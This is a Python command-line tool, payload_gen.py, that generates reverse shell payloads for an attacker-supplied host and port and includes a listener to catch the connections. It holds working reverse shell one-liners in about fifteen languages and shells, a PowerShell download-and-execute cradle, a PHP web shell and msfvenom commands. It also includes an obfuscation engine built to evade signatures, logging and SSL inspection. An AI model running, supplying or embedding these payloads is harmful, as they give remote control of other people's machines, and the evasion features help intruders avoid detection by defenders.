#!/usr/bin/env python3
"""
payload_gen.py — Reverse shell payload generator + obfuscator
==============================================================
Usage:
    python payload_gen.py <LHOST> <LPORT> [filter] [--obf <technique>]

Examples:
    python payload_gen.py 10.10.14.5 4444
    python payload_gen.py 10.10.14.5 4444 powershell
    python payload_gen.py 10.10.14.5 4444 linux --obf b64
    python payload_gen.py 10.10.14.5 4444 bash --obf xor
    python payload_gen.py 10.10.14.5 4444 --obf list      # show all techniques
    python payload_gen.py --listen 4444

Obfuscation techniques:
    b64       Base64-wrap the payload (bash/python/sh)
    b64ps     PowerShell -EncodedCommand (UTF-16LE base64)
    xor       XOR-encode + self-decoding stub (Python payloads)
    hex       Hex-escape all characters in the string
    url       URL-encode the full payload
    charfmt   PS char-array: [char[]](72,101,...) -join ''
    concat    PS string concatenation split to dodge signatures
    env       Break IP/port into env vars + reconstruct at runtime
    iex       Wrap PS in nested IEX to hide raw string from logs
    revstr    Reverse the payload string + decode stub
    unicode   Unicode escape sequences for the payload string
    sh_var    Assign fragments to shell vars then eval
"""

import sys, os, base64, urllib.parse, socket, random, string, re

R="\033[31m"; G="\033[32m"; Y="\033[33m"; C="\033[36m"; B="\033[1m"; M="\033[35m"; X="\033[0m"

# ══════════════════════════════════════════════════════════════════════════════
#  OBFUSCATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def _rvar(n=6):
    """Random variable name."""
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def obf_b64(payload: str, tags: list) -> str:
    """Wrap bash/sh/python one-liner in a base64 decode+exec stub."""
    enc = base64.b64encode(payload.encode()).decode()
    if "python" in tags or "python" in payload[:20]:
        return f"python3 -c \"exec(__import__('base64').b64decode('{enc}').decode())\""
    elif "powershell" in tags:
        return obf_b64ps(payload, tags)
    else:
        return f"echo {enc}|base64 -d|bash"

def obf_b64ps(payload: str, tags: list) -> str:
    """PowerShell -EncodedCommand (UTF-16LE base64)."""
    # Strip any existing powershell prefix to get the raw command
    raw = payload
    for prefix in ("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"",
                   "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "):
        if raw.startswith(prefix):
            raw = raw[len(prefix):]
            if raw.endswith('"'):
                raw = raw[:-1]
            break
    enc = base64.b64encode(raw.encode("utf-16-le")).decode()
    return f"powershell -NoP -NonI -W H -Exec Bypass -Enc {enc}"

def obf_xor(payload: str, tags: list) -> str:
    """XOR-encode the payload; emit a self-decoding Python stub."""
    key = random.randint(1, 254)
    enc = bytes(b ^ key for b in payload.encode())
    enc_b64 = base64.b64encode(enc).decode()
    v1, v2, v3 = _rvar(), _rvar(), _rvar()
    stub = (
        f"python3 -c \""
        f"import base64,os;"
        f"{v1}=base64.b64decode('{enc_b64}');"
        f"{v2}={key};"
        f"{v3}=''.join(chr(b^{v2}) for b in {v1});"
        f"exec({v3})"
        f"\""
    )
    return stub

def obf_hex(payload: str, tags: list) -> str:
    """Hex-escape every character."""
    if "powershell" in tags:
        hexed = "".join(f"\\x{ord(c):02x}" for c in payload)
        return f"powershell -c \"& ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([byte[]]@({','.join(str(ord(c)) for c in payload)}))))\""
    else:
        hexed = "".join(f"\\x{ord(c):02x}" for c in payload)
        return f"$'${hexed}'"

def obf_url(payload: str, tags: list) -> str:
    """URL-encode the payload (useful when injecting into HTTP params)."""
    return urllib.parse.quote(payload, safe='')

def obf_charfmt(payload: str, tags: list) -> str:
    """PowerShell char-array: ([char[]](72,101,...)) -join '' | iex"""
    raw = payload
    for prefix in ("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"",):
        if raw.startswith(prefix):
            raw = raw[len(prefix):].rstrip('"')
    ords = ",".join(str(ord(c)) for c in raw)
    v = _rvar()
    return f"powershell -c \"${v}=([char[]]({ords}))-join'';iex ${v}\""

def obf_concat(payload: str, tags: list) -> str:
    """Split suspicious PS keywords using string concat to dodge static sigs."""
    subs = {
        "IEX":            "I\"+\"EX",
        "Invoke-Expression": "Inv\"+\"oke-Expr\"+\"ession",
        "DownloadString": "Downl\"+\"oadS\"+\"tring",
        "Net.WebClient":  "N\"+\"et.WebC\"+\"lient",
        "System.Net":     "Sys\"+\"tem.N\"+\"et",
        "TCPClient":      "TCP\"+\"Client",
        "subprocess":     "sub\"+\"process",
        "socket":         "so\"+\"cket",
        "reverse":        "re\"+\"verse",
        "shell":          "sh\"+\"ell",
        "cmd.exe":        "cm\"+\"d.exe",
        "/bin/bash":      "/bin/b\"+\"ash",
        "/bin/sh":        "/bin/s\"+\"h",
    }
    result = payload
    for k, v in subs.items():
        result = result.replace(k, v)
    return result

def obf_env(payload: str, tags: list) -> str:
    """Break IP/port into env vars at runtime (harder to grep logs)."""
    # Find IP and port pattern in payload
    ip_m = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', payload)
    port_m = re.search(r'\b(\d{4,5})\b', payload)
    if not ip_m or not port_m:
        return f"# env obf: could not find IP/port pattern\n{payload}"
    ip   = ip_m.group(1)
    port = port_m.group(1)
    vi, vp = _rvar(4).upper(), _rvar(4).upper()
    modified = payload.replace(ip, f"${vi}").replace(f'"{port}"', f'"${vp}"').replace(f"'{port}'", f"'${vp}'").replace(port, f"${vp}")
    if "powershell" in tags:
        return f"$env:{vi}='{ip}'; $env:{vp}='{port}'; {modified}"
    else:
        return f"export {vi}={ip} {vp}={port}; eval \"{modified}\""

def obf_iex(payload: str, tags: list) -> str:
    """Wrap PS payload in nested IEX + string reverse to obscure command body."""
    raw = payload
    for prefix in ("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"",):
        if raw.startswith(prefix):
            raw = raw[len(prefix):].rstrip('"')
    rev = raw[::-1]
    enc = base64.b64encode(rev.encode("utf-16-le")).decode()
    v = _rvar()
    return (
        f"powershell -NoP -NonI -W H -Exec Bypass -c \""
        f"${v}=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{enc}'));"
        f"IEX(-join(${v}[-1..-${{{v}.Length}}]))\""
    )

def obf_revstr(payload: str, tags: list) -> str:
    """Reverse the payload string, decode at runtime with a short stub."""
    rev = payload[::-1]
    enc = base64.b64encode(rev.encode()).decode()
    if "powershell" in tags:
        v = _rvar()
        return (
            f"powershell -c \""
            f"${v}=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{enc}'));"
            f"iex(-join(${v}[-1..-${{{v}.Length}}]))\""
        )
    else:
        return f"python3 -c \"import base64;s=base64.b64decode('{enc}').decode();exec(s[::-1])\""

def obf_unicode(payload: str, tags: list) -> str:
    r"""Replace characters with unicode escapes (\uXXXX) in PS strings."""
    if "powershell" in tags:
        escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
        return f"powershell -c \"`\"{escaped}\"\""
    else:
        escaped = "".join(f"\\u{ord(c):04x}" for c in payload)
        return f"python3 -c \"exec('{escaped}'.encode().decode('unicode_escape'))\""

def obf_sh_var(payload: str, tags: list) -> str:
    """Assign payload fragments to random shell vars, then eval the joined result."""
    chunk = max(8, len(payload) // 6)
    parts = [payload[i:i+chunk] for i in range(0, len(payload), chunk)]
    vars_ = [_rvar(5) for _ in parts]
    assigns = ";".join(f"{v}='{p}'" for v, p in zip(vars_, parts))
    joined  = "".join(f"${v}" for v in vars_)
    return f"{assigns}; eval \"{joined}\""

OBFUSCATORS = {
    "b64":     (obf_b64,    "Base64 wrap → decode+exec stub"),
    "b64ps":   (obf_b64ps,  "PowerShell -EncodedCommand (UTF-16LE)"),
    "xor":     (obf_xor,    "XOR encode + random key + Python self-decode stub"),
    "hex":     (obf_hex,    "Hex-escape every character in the string"),
    "url":     (obf_url,    "URL-encode (for HTTP parameter injection)"),
    "charfmt": (obf_charfmt,"PS char-array: ([char[]](72,101,...)) -join '' | iex"),
    "concat":  (obf_concat, "Split keywords with '+' concat to bypass string sigs"),
    "env":     (obf_env,    "Hide IP/port in env vars, reconstruct at runtime"),
    "iex":     (obf_iex,    "PS: base64 reversed string + nested IEX"),
    "revstr":  (obf_revstr, "Reverse payload + base64, decode+reverse at runtime"),
    "unicode": (obf_unicode,"Unicode escape sequences \\uXXXX for all chars"),
    "sh_var":  (obf_sh_var, "Split into random shell vars, eval joined result"),
}

# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD CATALOGUE
# ══════════════════════════════════════════════════════════════════════════════

def build(ip: str, port: int) -> list[dict]:
    p = str(port)

    ps_raw = (
        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{p});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$x=$r+'PS '+(pwd)+'> ';"
        f"$n=[Text.Encoding]::ASCII.GetBytes($x);"
        f"$s.Write($n,0,$n.Length)}}"
    )
    ps_enc  = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {base64.b64encode(ps_raw.encode('utf-16-le')).decode()}"
    ps_iex  = f"powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{p}/s')\""
    ps_loop = (
        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{p});"
        f"$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;"
        f"$b=New-Object Byte[] 1024;$e=New-Object Text.ASCIIEncoding;"
        f"while($c.Connected){{while($s.DataAvailable){{"
        f"$r=$e.GetString($b,0,$s.Read($b,0,$b.Length));"
        f"try{{$o=iex $r 2>&1|Out-String}}catch{{$o=$_.ToString()}};"
        f"$w.WriteLine($o)}};Start-Sleep -Milliseconds 100}}"
    )

    return [
        # ── PowerShell ──────────────────────────────────────────────────────
        {"name":"powershell-encoded","tags":["windows","powershell"],
         "desc":"Base64 UTF-16LE encoded — bypasses most string filters",
         "cmd": ps_enc},
        {"name":"powershell-raw","tags":["windows","powershell"],
         "desc":"Raw PS one-liner (visible in logs, use --obf to harden)",
         "cmd": f"powershell -NoP -NonI -W Hidden -Exec Bypass -c \"{ps_raw}\""},
        {"name":"powershell-cradle","tags":["windows","powershell","http"],
         "desc":"Download+exec — host a shell script at /s on your web server",
         "cmd": ps_iex},
        {"name":"powershell-loop","tags":["windows","powershell"],
         "desc":"Stable loop shell with try/catch — good for interactive use",
         "cmd": f"powershell -NoP -NonI -Exec Bypass -c \"{ps_loop}\""},

        # ── Bash / sh ───────────────────────────────────────────────────────
        {"name":"bash-tcp","tags":["linux","bash"],
         "desc":"Classic bash /dev/tcp",
         "cmd": f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"},
        {"name":"bash-tcp-b64","tags":["linux","bash"],
         "desc":"Base64-wrapped bash — avoids >& in logs",
         "cmd": f"echo {base64.b64encode(f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'.encode()).decode()}|base64 -d|bash"},
        {"name":"bash-196","tags":["linux","bash"],
         "desc":"bash using file descriptor 196",
         "cmd": f"0<&196;exec 196<>/dev/tcp/{ip}/{p}; sh <&196 >&196 2>&196"},
        {"name":"sh-dev-tcp","tags":["linux","sh"],
         "desc":"/bin/sh via /dev/tcp",
         "cmd": f"/bin/sh -i >& /dev/tcp/{ip}/{p} 0>&1"},

        # ── Python ──────────────────────────────────────────────────────────
        {"name":"python3-pty","tags":["linux","python"],
         "desc":"Python 3 + pty.spawn — best interactive shell",
         "cmd": f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{p}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"},
        {"name":"python3-win","tags":["windows","python"],
         "desc":"Python 3 Windows (no pty)",
         "cmd": f"python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])\""},
        {"name":"python2","tags":["linux","python"],
         "desc":"Python 2 socket shell",
         "cmd": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"},

        # ── Netcat ──────────────────────────────────────────────────────────
        {"name":"nc-mkfifo","tags":["linux","netcat"],
         "desc":"nc with mkfifo — works without -e flag",
         "cmd": f"rm /tmp/.f;mkfifo /tmp/.f;cat /tmp/.f|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/.f"},
        {"name":"nc-e","tags":["linux","netcat"],
         "desc":"nc -e (traditional netcat only)",
         "cmd": f"nc -e /bin/sh {ip} {p}"},
        {"name":"nc-win","tags":["windows","netcat"],
         "desc":"nc.exe Windows",
         "cmd": f"nc.exe -e cmd.exe {ip} {p}"},

        # ── Perl ────────────────────────────────────────────────────────────
        {"name":"perl","tags":["linux","perl"],
         "desc":"Perl socket shell",
         "cmd": f"perl -e 'use Socket;$i=\"{ip}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"},

        # ── Ruby ────────────────────────────────────────────────────────────
        {"name":"ruby","tags":["linux","ruby"],
         "desc":"Ruby socket shell",
         "cmd": f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{p});[0,1,2].each{{|i|i.reopen(f)}};exec \"/bin/sh -i\"'"},

        # ── PHP ─────────────────────────────────────────────────────────────
        {"name":"php-proc_open","tags":["web","php"],
         "desc":"PHP proc_open — most reliable",
         "cmd": f"php -r \"$s=fsockopen('{ip}',{p});$p=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$p);\""},
        {"name":"php-exec","tags":["web","php"],
         "desc":"PHP exec variant",
         "cmd": f"php -r \"exec('/bin/bash -c \\\"bash -i >& /dev/tcp/{ip}/{p} 0>&1\\\"')\""},
        {"name":"php-webshell","tags":["web","php"],
         "desc":"One-line PHP webshell (upload + trigger via ?c=cmd)",
         "cmd": "<?php system($_GET['c']); ?>"},

        # ── Groovy / Jenkins ────────────────────────────────────────────────
        {"name":"groovy","tags":["linux","windows","groovy","jenkins"],
         "desc":"Groovy script console (Jenkins, etc.)",
         "cmd": (f'String h="{ip}";int p={p};String c="/bin/bash";\n'
                 f'Process pr=new ProcessBuilder(c).redirectErrorStream(true).start();\n'
                 f'Socket so=new Socket(h,p);\n'
                 f'InputStream pi=pr.getInputStream(),si=so.getInputStream();\n'
                 f'OutputStream po=pr.getOutputStream(),st=so.getOutputStream();\n'
                 f'while(!so.isClosed()){{while(pi.available()>0)st.write(pi.read());\n'
                 f'while(si.available()>0)po.write(si.read());st.flush();po.flush();Thread.sleep(50);}}')},

        # ── Node.js ─────────────────────────────────────────────────────────
        {"name":"nodejs","tags":["linux","windows","node"],
         "desc":"Node.js child_process shell",
         "cmd": f"node -e \"require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/{ip}/{p} 0>&1\\\"')\""},

        # ── socat ───────────────────────────────────────────────────────────
        {"name":"socat","tags":["linux","socat"],
         "desc":"socat PTY shell — best interactive shell on Linux",
         "cmd": f"socat TCP:{ip}:{p} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"},
        {"name":"socat-listener","tags":["linux","listener"],
         "desc":"socat listener — run on YOUR machine for the socat payload",
         "cmd": f"socat file:`tty`,raw,echo=0 TCP-LISTEN:{p}"},

        # ── OpenSSL (encrypted) ─────────────────────────────────────────────
        {"name":"openssl-listener","tags":["linux","listener","encrypted"],
         "desc":"Step 1: generate cert + start encrypted listener on YOUR machine",
         "cmd": (f"openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem "
                 f"-days 7 -nodes -subj '/CN=tmp' 2>/dev/null && "
                 f"openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port {p}")},
        {"name":"openssl-shell","tags":["linux","encrypted"],
         "desc":"Step 2: encrypted shell on target — beats SSL inspection",
         "cmd": f"mkfifo /tmp/.s; /bin/sh -i < /tmp/.s 2>&1 | openssl s_client -quiet -connect {ip}:{p} > /tmp/.s; rm /tmp/.s"},

        # ── Java ────────────────────────────────────────────────────────────
        {"name":"java","tags":["linux","windows","java"],
         "desc":"Java Runtime.exec (paste into a code execution context)",
         "cmd": (f'Runtime r=Runtime.getRuntime();'
                 f'Process p=r.exec(new String[]{{"bash","-c","bash -i >& /dev/tcp/{ip}/{p} 0>&1"}});'
                 f'p.waitFor();')},

        # ── Awk ─────────────────────────────────────────────────────────────
        {"name":"awk","tags":["linux","awk"],
         "desc":"awk inet socket shell",
         "cmd": f"awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{p}\";while(42){{do{{printf \"$ \"|&s;s|&getline c;if(c){{while((c|&getline)>0)print|&s;close(c)}}}}while(c!=\"exit\")}}}}' /dev/null"},

        # ── Lua ─────────────────────────────────────────────────────────────
        {"name":"lua","tags":["linux","lua"],
         "desc":"Lua socket shell",
         "cmd": f"lua -e \"local s=require('socket');local t=s.tcp();t:connect('{ip}',{p});while true do local r=t:receive();local f=io.popen(r,'r');local b=f:read('*a');t:send(b) end\""},

        # ── telnet ──────────────────────────────────────────────────────────
        {"name":"telnet","tags":["linux","telnet"],
         "desc":"telnet double-pipe shell",
         "cmd": f"TF=$(mktemp -u); mkfifo $TF && telnet {ip} {p} 0<$TF | /bin/sh 1>$TF"},

        # ── msfvenom generation commands ────────────────────────────────────
        {"name":"msfvenom-linux","tags":["linux","msfvenom"],
         "desc":"Generate Linux ELF (run on YOUR machine)",
         "cmd": f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={p} -f elf -o /tmp/srv && chmod +x /tmp/srv"},
        {"name":"msfvenom-win","tags":["windows","msfvenom"],
         "desc":"Generate Windows exe (run on YOUR machine)",
         "cmd": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={p} -f exe -o /tmp/srv.exe"},
        {"name":"msfvenom-aspx","tags":["web","windows","msfvenom"],
         "desc":"ASPX web shell for IIS — upload then visit /srv.aspx",
         "cmd": f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={p} -f aspx -o srv.aspx"},
        {"name":"msfvenom-war","tags":["web","java","msfvenom"],
         "desc":"WAR payload for Tomcat (upload via manager)",
         "cmd": f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={p} -f war -o srv.war"},

        # ── Shell upgrade ────────────────────────────────────────────────────
        {"name":"upgrade-pty","tags":["linux","upgrade"],
         "desc":"Upgrade dumb shell → full PTY (run INSIDE shell after catching it)",
         "cmd": ("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
                 "# Ctrl-Z → stty raw -echo; fg\n"
                 "# then: export TERM=xterm; stty rows 40 cols 140")},
        {"name":"upgrade-script","tags":["linux","upgrade"],
         "desc":"PTY upgrade via script (if python not available)",
         "cmd": "script /dev/null -c bash"},
    ]


# ══════════════════════════════════════════════════════════════════════════════
#  DISPLAY
# ══════════════════════════════════════════════════════════════════════════════

def print_payload(i: int, p: dict, obf_name: str = None, obf_result: str = None):
    print(f"\n{B}{Y}[{i}] {p['name']}{X}  {C}({', '.join(p['tags'])}){X}")
    print(f"    {p['desc']}")
    print(f"  {G}{p['cmd']}{X}")
    if obf_result and obf_result != p["cmd"]:
        print(f"  {M}  ── obf:{obf_name} ──{X}")
        print(f"  {M}{obf_result}{X}")


def list_obfuscators():
    print(f"\n{B}Available obfuscation techniques:{X}\n")
    for name, (_, desc) in OBFUSCATORS.items():
        print(f"  {Y}{name:<12}{X} {desc}")
    print()


def main():
    args = sys.argv[1:]

    # --listen mode
    if args and args[0] in ("--listen", "-l"):
        if len(args) < 2:
            print(f"{R}Usage: python payload_gen.py --listen <PORT>{X}")
            sys.exit(1)
        _listen(int(args[1]))
        return

    # --obf list
    if "--obf" in args:
        idx = args.index("--obf")
        if idx + 1 < len(args) and args[idx + 1] == "list":
            list_obfuscators()
            return

    if len(args) < 2:
        print(f"{B}Usage:{X} python payload_gen.py <LHOST> <LPORT> [filter] [--obf <technique>]")
        print(f"       python payload_gen.py --listen <PORT>")
        print(f"       python payload_gen.py 10.0.0.1 4444 --obf list\n")
        print(f"{B}Filters:{X} linux  windows  powershell  web  php  python  netcat  bash  msfvenom  upgrade  encrypted")
        sys.exit(0)

    ip   = args[0]
    port = int(args[1])

    # Parse optional filter and --obf
    obf_name = None
    filt     = None
    i = 2
    while i < len(args):
        if args[i] == "--obf":
            if i + 1 < len(args):
                obf_name = args[i + 1]
                i += 2
            else:
                print(f"{R}[!] --obf requires a technique name. Use --obf list to see options.{X}")
                sys.exit(1)
        else:
            filt = args[i]
            i += 1

    if obf_name and obf_name not in OBFUSCATORS:
        print(f"{R}[!] Unknown obfuscation technique: '{obf_name}'{X}")
        list_obfuscators()
        sys.exit(1)

    payloads = build(ip, port)

    print(f"\n{B}Target : {Y}{ip}:{port}{X}  |  Listener: {C}nc -lvnp {port}{X}")
    if filt:
        print(f"{B}Filter : {filt}{X}")
    if obf_name:
        fn, desc = OBFUSCATORS[obf_name]
        print(f"{B}Obf    : {M}{obf_name}{X} — {desc}")

    shown = 0
    for idx, pl in enumerate(payloads):
        if filt and filt.lower() not in " ".join(pl["tags"]) and filt.lower() not in pl["name"]:
            continue
        obf_result = None
        if obf_name:
            try:
                fn, _ = OBFUSCATORS[obf_name]
                obf_result = fn(pl["cmd"], pl["tags"])
            except Exception as e:
                obf_result = f"(obfuscation failed: {e})"
        print_payload(idx, pl, obf_name, obf_result)
        shown += 1

    if shown == 0:
        print(f"{R}[!] No payloads matched filter '{filt}'{X}")
    else:
        print(f"\n{B}Total: {shown} payload(s){X}\n")


# ══════════════════════════════════════════════════════════════════════════════
#  BUILT-IN LISTENER
# ══════════════════════════════════════════════════════════════════════════════

def _listen(port: int):
    print(f"{B}[*] Listening on 0.0.0.0:{port}  (Ctrl-C to quit){X}")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    conn, addr = srv.accept()
    print(f"{G}[+] Connection from {addr[0]}:{addr[1]}{X}\n")
    try:
        import tty, termios, select
        old = termios.tcgetattr(sys.stdin)
        try:
            tty.setraw(sys.stdin.fileno())
            while True:
                r, _, _ = select.select([conn, sys.stdin], [], [])
                if conn in r:
                    data = conn.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                if sys.stdin in r:
                    data = os.read(sys.stdin.fileno(), 1024)
                    if not data:
                        break
                    conn.send(data)
        finally:
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
    except ImportError:
        # Windows fallback — basic I/O
        import threading
        def recv():
            while True:
                d = conn.recv(4096)
                if not d:
                    break
                sys.stdout.buffer.write(d)
                sys.stdout.buffer.flush()
        t = threading.Thread(target=recv, daemon=True)
        t.start()
        while t.is_alive():
            line = input()
            conn.send((line + "\n").encode())
    conn.close()
    print(f"\n{Y}[*] Connection closed{X}")


if __name__ == "__main__":
    main()
